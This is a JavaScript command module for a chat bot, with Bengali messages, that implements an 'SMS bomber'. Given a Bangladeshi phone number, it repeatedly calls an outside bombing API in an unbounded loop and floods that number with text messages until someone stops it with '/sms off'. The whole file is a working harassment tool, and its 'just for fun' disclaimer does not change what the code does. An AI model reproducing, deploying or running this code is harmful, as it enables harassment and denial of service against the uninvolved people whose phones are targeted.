module.exports.config = {
  name: "sms",
  version: "2.0.0",
  hasPermssion: 0,
  credits: "BaBy Jann Bot", //ক্রেডিট চেঞ্জ করলে এপিআই বন্ধ করে দেব।
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};

module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];

  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("•┄┅════❁🌺❁════┅┄•\n\n☠️••SMS BOMBER BY BaBy Jann Bot 💣\n\nব্যবহার:\n/sms 01xxxxxxxxx\n\n(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)\n\n•┄┅════❁🌺❁════┅┄•", threadID);
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /sms off", threadID);
  }

  api.sendMessage(`✅ SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\nবন্ধ করতে /sms off`, threadID);

  bombingFlags[threadID] = true;

  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`http://lewraxhub.store/bomber/apii/sms/all.php?phone=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
